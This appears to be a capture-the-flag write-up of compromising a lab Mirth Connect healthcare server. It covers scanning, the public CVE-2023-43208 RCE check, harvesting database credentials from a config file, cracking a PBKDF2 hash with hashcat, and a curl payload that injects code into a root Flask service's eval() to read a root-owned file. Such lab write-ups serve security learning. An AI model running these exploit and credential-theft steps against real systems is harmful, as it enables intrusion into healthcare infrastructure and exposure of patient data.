---
title: "Hacking NextGen HealtCare getting root on the system"
date: 2026-02-21 00:00:00 +0800
categories: [Bug bounty, hacking]
tags: [Bug bounty, CTF, Hacking]
--- 

## Intro
In this articlewe are going to exploit a healthcare integration engine , taking advantage of Remote Command Execution vulnerability: CVE-2023-43208 and some internal misconfigurations.

In a real-life scenario, it might be one of the worst nightmares for people working in healthcare enviroments, since not only every patient's record could be removed, but it would also fully compromise the CIA triad and the HIPAA standards.

## Information gathering

Our target IP will be: 10.129.1.210<br>
Let's start with a quick network scan
```bash
❯ rustscan -a $IP --ulimit 5000 -g
10.129.1.210 -> [22,80,6661,443]
```

```bash
❯ nmap -sT -A -Pn -T5 -p 22,80,6661,4431 $IP --disable-arp-ping --min-rtt-timeout 50ms --max-rtt-timeout 100ms --stats-every=2s -v
```

```bash
PORT     STATE  SERVICE VERSION  
22/tcp   open   ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)  
| ssh-hostkey:    
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)  
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)  
80/tcp   open   http    Jetty  
|_http-title: Mirth Connect Administrator  
|_http-favicon: Unknown favicon MD5: 62BE2608829EE4917ACB671EF40D5688  
| http-methods:    
|   Supported Methods: GET HEAD TRACE OPTIONS  
|_  Potentially risky methods: TRACE  
443/tcp open  ssl/http Jetty  
|_http-title: Mirth Connect Administrator  
| ssl-cert: Subject: commonName=mirth-connect  
| Not valid before: 2025-09-19T12:50:05  
|_Not valid after:  2075-09-19T12:50:05  
|_ssl-date: TLS randomness does not represent time  
| http-methods:    
|_  Potentially risky methods: TRACE
6661/tcp open   unknown  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

After getting this hash: 62BE2608829EE4917ACB671EF40D5688 which is the MD5 checksum of the icon used in the framework, i tried to compare it to other hashes located in [OWASP Favicon Database](https://owasp.org/www-community/favicons_database) to better understand the framework exact version, however, i had no luck, so i moved on.

#### Services and Technologies:
22 --> OpenSSH 9.2p1
80 --> HTTP server
443 --> HTTPS server
6661 --> IRC?

### Web service
Realizing that port 80 and 443 were almost the same service, (also it was not possible to access without the HTTPS protocol) i started enumerating 443.

<img width="636" height="448" alt="image" src="https://github.com/user-attachments/assets/53564e67-106d-4cb0-b07d-b871f10aa5ee" />

Looking for default credentials we found out that admin/admin are the default ones, however, since they were not valid, i moved on looking for the version that was used in 2021 (Since i saw thanks to the copyright that date.)

<img width="316" height="50" alt="image" src="https://github.com/user-attachments/assets/e1a0b475-708e-4db0-a0cb-2042c84e849c" />

The version should be: ==3.12.0==

At this point i started enumerating some publicy accessible file by using some directory brute-forcing tools:
```bash
feroxbuster -u https://10.129.1.210 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  
t -X 404 --insecure
```
But no relevant findings were identified.

## Getting a shell
I started looking for CVEs and i found out this one: [CVE-2023-43208](https://www.acn.gov.it/portale/w/vulnerabilita-in-prodotti-nextgen-healthcare-al03/231026/csirt-ita-aggiornamento) which impacts all the versions prior to 4.4.X.
Looking in github i found out this PoC that verify whether the target server is vulnerable or not: [POC](https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT)

Results: 
```bash
❯ python3 exploit.py check -t https://10.129.1.210  
  
  
  ╔═══════════════════════════════════════════════════════════════╗  
  ║  CVE-2023-43208  ·  Mirth Connect Pre-Auth RCE                ║  
  ║  XStream Deserialization Bypass (patch bypass CVE-2023-37679) ║  
  ╚═══════════════════════════════════════════════════════════════╝  
  Affected: Mirth Connect < 4.4.1  |  CVSS 9.8  
  
[*] Target: https://10.129.1.210  
[*] Detecting Mirth Connect instance...  
[+] Mirth Connect instance detected.  
[*] Fetching version...  k
[*] Version: 4.4.0  
[+] VULNERABLE — Mirth Connect 4.4.0 < 4.4.1
```
At this point with a reverse shell we gained access to the mirth system user. <br>

After getting a shell i started looking for:
- Vulnerable SUID binaries
- Vulnerable Versions
- Crontab
- Running process
- Internal services
- Sensitive files


The last one was the one.
Exploring the mirthconnect directories, i found : 
/usr/local/mirthconnect/conf/mirth.properties
Which contained:

```bash
database.username = mirthdb  
database.password = Mir***s123!
```

So i started connecting to the MariaDB database with those credentials and it worked!

```bash
> which mysql  
/usr/bin/mysql
```

```bash
/usr/bin/mysql -h 127.0.0.1 -u mirthdb -p

---
MariaDB [(none)]> show databases;  
show databases;  
+--------------------+  
| Database           |  
+--------------------+  
| information_schema |  
| mc_bdd_prod        |  
+--------------------+  
2 rows in set (0.001 sec)

```

<img width="317" height="684" alt="image" src="https://github.com/user-attachments/assets/737c4eaf-49aa-4b27-84a3-a3e847f04eba" />

<img width="698" height="168" alt="image" src="https://github.com/user-attachments/assets/72ce4c04-a162-4f0a-9ba3-652870b6346a" />


I found a hash, the sedric’s password hash!
The only problem was understanding how this hash could be cracked.

Leaving this on the side, i tried using those credentials to access in mirth (both Web and cli )
```bash
./mccommand -a 10.129.1.210:6661 -u 'sedric' -p 'Mir***a***123!'  
```

But nothing seemed to work

After further analysis, since it's an open source project, i decided to take a look into the password generation code: [Code](https://github.com/nextgenhealthcare/connect/blob/development/core-util%2Fsrc%2Fcom%2Fmirth%2Fcommons%2Fencryption%2FDigester.java)

Noticed it was using PBKDF2WithHmacSHA256 by
 ```java
  private String algorithm = "PBKDF2WithHmacSHA256";
  ```
and the iterations was 600.000 (💀)

By the way: 
Converting the hash in HEX, the bytes were: 40 bytes, since SHA-256 produce 32 byte hash, that means that the first 8 byte were the salt and the rest the digest, in the end, i used the hashcat module 10900 that manage PBKDF2-SHA256 .
```bash
hashcat -m 10900 -a 0 "sha256:600000:bbff8b0413949da7:5b8b15d082216c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb0b32ddf0fb" /usr/share/wordlists/rockyou.txt  -w 3
```

After cracking the password, i finally got access as sedric!

### Privilege escalation
The root process was pretty straightforward: <br>
I noticed two things:
1. with `ss -tulpn` a weird port was running as 54321
2. A root process was running as /usr/local/bin/notif.py

/usr/local/bin/notif.py was fortunately readable and i read this:

```python
from flask import Flask, request, abort  
import re  
import uuid  
from datetime import datetime  
import xml.etree.ElementTree as ET, os  
  
app = Flask(__name__)  
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)  
  
def template(first, last, sender, ts, dob, gender):  
   pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")  
   for s in [first, last, sender, ts, dob, gender]:  
       if not pattern.fullmatch(s):  
           return "[INVALID_INPUT]"  
   # DOB format is DD/MM/YYYY  
   try:  
       year_of_birth = int(dob.split('/')[-1])  
       if year_of_birth < 1900 or year_of_birth > datetime.now().year:  
           return "[INVALID_DOB]"  
   except:  
       return "[INVALID_DOB]"  
   template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"  
   try:  
       return eval(f"f'''{template}'''")  
   except Exception as e:  
       return f"[EVAL_ERROR] {e}"  
  
@app.route("/addPatient", methods=["POST"])  
def receive():  
   if request.remote_addr != "127.0.0.1":  
       abort(403)  
   try:  
       xml_text = request.data.decode()  
       xml_root = ET.fromstring(xml_text)  
   except ET.ParseError:  
       return "XML ERROR\n", 400  
   patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")  
   if patient is None:  
       return "No <patient> tag found\n", 400  
   id = uuid.uuid4().hex  
   data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}  
   notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])  
   path = os.path.join(USER_DIR,f"{id}.txt")  
   with open(path,"w") as f:  
       f.write(notification+"\n")  
   return notification  
  
if __name__=="__main__":  
   app.run("127.0.0.1",54321, threaded=True)
```

Noticed something? it's the reason 54321 port was listening!

So i forwarded with SSH this port in my client 
``` 
❯ ssh sedric@10.129.1.210 -L 54321:0.0.0.0:54321 
```
and went to the web page.
After that i carefully reviewed the code and noticed a critical vulnerability.

The script is made for adding patients through XML Post requests and saving all in /var/secure-health/patients/<id>.txt

The problem relies on the eval() function, even if the the scripts tries to validate the requests in two ways:
    - If the request doesn't come from 127.0.0.1: Deny
    - If the request contain specific characters: Deny
It's still vulnerable.

```python
return eval(f"f'''{template}'''")
```
As you can see in the code, template is user-controlled, and since we forwarded the port to our host, every request is made with 127.0.0.1 and we will not be denied.

After a bit of time, i figured out how to craft the perfect request:

```
curl -X POST http://127.0.0.1:54321/addPatient \
     -H "Content-Type: application/xml" \
     -d "<patient><firstname>{open('/root/'+'root.txt').read()}</firstname><lastname>Rossi</lastname><sender_app>Mirth</sender_app><timestamp>10</timestamp><birth_date>01/01/2000</birth_date><gender>M</gender></patient>"
```
And at this point, i gained root access! :D


## Bonus
I ended up in a rabbit hole: since the hash seemed too complicated to crack, i supposed it was not the right path and went through a Java Keystore file.

Since in the same file as before i found:
```
keystore.path = ${dir.appdata}/keystore.jks  
keystore.storepass = 5GbU5H***OOgE  
keystore.keypass = tAuJfQe*** 
keystore.type = JCEKS
```
i carried that file to my machine, used keytool to extract every data available inside 
```
keytool -list -v -keystore keystore.jks/keystore.jks  
```

Ending up with:

```
❯ keytool -list -v -keystore keystore.jks/keystore.jks  
Enter keystore password:     
Keystore type: JCEKS  
Keystore provider: SunJCE  
  
Your keystore contain 2 entries  
  
Alias name: encryption  
Creation date: Sep 19, 2025  
Entry type: SecretKeyEntry  
  
  
*******************************************  
*******************************************  
  
  
Alias name: mirthconnect  
Creation date: Sep 19, 2025  
Entry type: PrivateKeyEntry  
Certificate chain length: 1  
Certificate[1]:  
Owner: CN=mirth-connect  
Issuer: CN=Mirth Connect Certificate Authority  
Serial number: 2cd6f777ed4e9  
Valid from: Fri Sep 19 14:50:05 CEST 2025 until: Thu Sep 19 14:50:05 CEST 2075  
Certificate fingerprints:  
        SHA1: 3F:2B:A7:D8:5C:81:9E:CF:6E:15:CB:6A:FD:C6:DF:02:8D:9B:11:79  
        SHA256: 40:89:E4:38:BC:E4:10:91:6E:DB:CC:45:32:F3:F0:6E:9E:3E:E3:E0:C4:76:BD:62:E1:20:AA:BC:8E:1D:30:B4  
Signature algorithm name: SHA256withRSA  
Subject Public Key Algorithm: 2048-bit RSA key  
Version: 3  
  
Extensions:    
  
#1: ObjectId: 2.5.29.35 Criticality=false  
AuthorityKeyIdentifier [  
KeyIdentifier [  
0000: 30 82 02 EF 30 82 01 D7   A0 03 02 01 02 02 01 01  0...0...........  
0010: 30 0D 06 09 2A 86 48 86   F7 0D 01 01 0B 05 00 30  0...*.H........0  
0020: 2E 31 2C 30 2A 06 03 55   04 03 0C 23 4D 69 72 74  .1,0*..U...#Mirt  
0030: 68 20 43 6F 6E 6E 65 63   74 20 43 65 72 74 69 66  h Connect Certif  
0040: 69 63 61 74 65 20 41 75   74 68 6F 72 69 74 79 30  icate Authority0  
0050: 20 17 0D 32 35 30 39 31   39 31 32 35 30 30 35 5A   ..250919125005Z  
0060: 18 0F 32 30 37 35 30 39   31 39 31 32 35 30 30 35  ..20750919125005  
0070: 5A 30 2E 31 2C 30 2A 06   03 55 04 03 0C 23 4D 69  Z0.1,0*..U...#Mi  
0080: 72 74 68 20 43 6F 6E 6E   65 63 74 20 43 65 72 74  rth Connect Cert  
0090: 69 66 69 63 61 74 65 20   41 75 74 68 6F 72 69 74  ificate Authorit  
00A0: 79 30 82 01 22 30 0D 06   09 2A 86 48 86 F7 0D 01  y0.."0...*.H....  
00B0: 01 01 05 00 03 82 01 0F   00 30 82 01 0A 02 82 01  .........0......  
00C0: 01 00 B1 E6 D7 52 39 D9   67 D8 D5 4F D8 43 44 73  .....R9.g..O.CDs  
00D0: 80 90 9A 49 18 FF 53 BA   E0 D2 EF 06 75 AB F9 9B  ...I..S.....u...  
00E0: BC 01 6C B3 15 10 62 19   C7 AA 21 79 D6 22 92 96  ..l...b...!y."..  
00F0: 3B 9C 71 48 E6 EA B0 C8   92 DA E4 8B 0A 3D FF B2  ;.qH.........=..  
0100: 9A EF 7D 7F A6 A2 39 26   AD 9B E9 21 80 EA 4D 0A  ......9&...!..M.  
0110: 1A C9 68 DD 23 F3 00 9F   BE 95 05 9A D9 E2 D1 B2  ..h.#...........  
0120: 3C A8 9B 33 A9 AC 2C 2F   CF 35 E4 95 26 D1 A7 79  <..3..,/.5..&..y  So somethingSo something
0130: 1D 06 B5 3D 72 07 75 46   61 F4 84 38 97 88 24 B6  ...=r.uFa..8..$.  
0140: B6 F8 F7 07 11 14 A0 D9   BF B1 06 CA EC 5A 61 AA  .............Za.  
0150: C1 32 30 97 A3 46 DC C3   DC CE 65 03 C6 89 95 A7  .20..F....e.....  
0160: 3E C4 A4 C6 45 91 AE 2C   96 64 53 F3 55 BD 94 8A  >...E..,.dS.U...  
0170: 60 5E 5F E3 54 08 0B 16   86 54 43 4A BB B5 AD 44  `^_.T....TCJ...D  
0180: D1 67 5F 79 69 23 31 FD   2A 10 5E 6C 2D 29 B8 52  .g_yi#1.*.^l-).R  
0190: 30 D1 92 AF FE C5 1F 1E   67 B2 B5 34 14 0B FB 5B  0.......g..4...[  
01A0: 14 96 6C A1 9D F2 67 4C   67 E2 93 5D E0 D3 17 E9  ..l...gLg..]....  
01B0: 1F 55 8D 5A C6 87 6D 18   BA 1B BD 0C CD 0B 39 D6  .U.Z..m.......9.  
01C0: AA E5 02 03 01 00 01 A3   16 30 14 30 12 06 03 55  .........0.0...U  
01D0: 1D 13 01 01 FF 04 08 30   06 01 01 FF 02 01 00 30  .......0.......0  
01E0: 0D 06 09 2A 86 48 86 F7   0D 01 01 0B 05 00 03 82  ...*.H..........  
01F0: 01 01 00 50 78 64 AC 02   76 A9 CF A8 D5 99 84 48  ...Pxd..v......H  
0200: B8 5D 1A 10 63 4F F9 6C   6F ED 77 E5 CF F1 AD E5  .]..cO.lo.w.....  
0210: CA E7 47 41 1E BE 24 6F   16 DB F0 C6 32 B7 B2 72  ..GA..$o....2..r  
0220: 39 DA 74 90 9A 32 7F CA   7C 11 D4 2E D5 20 6E 7A  9.t..2....... nz  
0230: 6C 09 22 47 40 6F F1 98   14 BD 8D E4 FC 35 4B B6  l."G@o.......5K.  
0240: 47 CE F1 2B 2A 54 EC 5D   2B D3 C0 36 4F D6 DD B8  G..+*T.]+..6O...  
0250: 04 52 59 80 09 2C 5F 20   DD 45 46 84 2D 68 E5 F5  .RY..,_ .EF.-h..  
0260: 3E B7 48 F7 CD 45 44 18   A1 DD 94 2D 86 8A 86 55  >.H..ED....-...U  
0270: F4 98 39 7B B0 48 A3 F8   AA AC B7 17 0F A4 0E 04  ..9..H..........  
0280: E8 B9 D3 DA 0C 2D 83 78   D2 28 C8 E9 0E 0A 4F 4C  .....-.x.(....OL  
0290: 74 D6 80 DE 98 FB A2 AE   AA 3A 09 58 38 7C A9 D5  t........:.X8...  
02A0: 8C 11 9D 5D E5 86 76 C1   FD 0D 9B 0A 3B 9C E9 C5  ...]..v.....;...  
02B0: 3D 83 70 D5 ED 16 7E D6   74 8F B4 16 55 27 FB 50  =.p.....t...U'.P  
02C0: 33 FA B1 73 B9 09 43 65   FC 94 03 18 98 5E D2 F8  3..s..Ce.....^..  
02D0: 65 A3 86 60 A3 4D 8C A0   84 0A AB AF A5 D3 B6 38  e..`.M.........8  
02E0: A7 42 72 5E A8 08 80 49   7D 11 83 9E 1D 90 EC 52  .Br^...I.......R  
02F0: 2A 2B 9C                                           *+.  
]  
]  
  
#2: ObjectId: 2.5.29.14 Criticality=false  
SubjectKeyIdentifier [  
KeyIdentifier [  
0000: 30 82 01 22 30 0D 06 09   2A 86 48 86 F7 0D 01 01  0.."0...*.H.....  
0010: 01 05 00 03 82 01 0F 00   30 82 01 0A 02 82 01 01  ........0.......  
0020: 00 E7 25 D5 9C 99 7D 46   39 E6 F1 8C 10 74 29 2A  ..%....F9....t)*  
0030: FE 36 17 DD 07 B3 0A DE   16 78 75 51 9B 6B 45 33  .6.......xuQ.kE3  
0040: C1 2D 91 06 F0 CA 78 77   0B 14 49 D9 F2 65 18 D6  .-....xw..I..e..  
0050: 96 25 BF C3 D1 3B B6 B1   A5 B7 69 20 F4 D9 92 D1  .%...;....i ....  
0060: A1 F5 CF 01 5B 44 C8 0E   E9 1B E5 18 7F 18 DE A4  ....[D..........  
0070: 98 2B 55 F3 EE FC F8 9E   AF 1D 92 57 C3 40 47 87  .+U........W.@G.  
0080: 90 A3 A8 AF 19 23 AC 76   79 9E C2 2E A2 D4 35 AC  .....#.vy.....5.  
0090: C3 50 DC 83 BA 6C 60 AB   CE 8C E8 75 A9 E6 D6 4B  .P...l`....u...K  
00A0: C6 00 32 26 A1 B2 2A 42   0F 36 35 41 BE 95 47 F7  ..2&..*B.65A..G.  
00B0: DE 5B 56 E0 30 3C 62 8B   19 79 B7 0E 1A D6 B3 03  .[V.0<b..y......  
00C0: 41 37 66 11 1A BB 78 B3   3D F8 60 4D 83 B1 60 4C  A7f...x.=.`M..`L  
00D0: 34 FB BD 6E 3C AD 62 4B   58 0C 3E 09 19 39 21 0E  4..n<.bKX.>..9!.  
00E0: 79 AB 68 11 1D 25 FA D2   12 34 6B A3 07 0C 7A A7  y.h..%...4k...z.  
00F0: 4A 84 39 52 AE C8 3D 5C   90 F7 8B 43 75 B9 B7 24  J.9R..=\...Cu..$  
0100: A8 A1 91 D5 ED D0 31 B5   83 F9 6D 61 14 58 8A 47  ......1...ma.X.G  
0110: 5A 43 44 34 BF 61 1D AD   47 1E EF F4 84 54 E1 C7  ZCD4.a..G....T..  
0120: 15 02 03 01 00 01                                  ......  
]  
]  
  
  
  
*******************************************  
*******************************************  
  
  
  
Warning:  
The JCEKS keystore uses a proprietary format. It is recommended to migrate to PKCS12 which is an industry standard forma  
t using "keytool -importkeystore -srckeystore keystore.jks/keystore.jks -destkeystore keystore.jks/keystore.jks -deststo  
retype pkcs12".
```
But i realized it didn't contain any sensitive information and decided to give another shot the hash, which results in being the right path for taking over and fully compromise the machine!



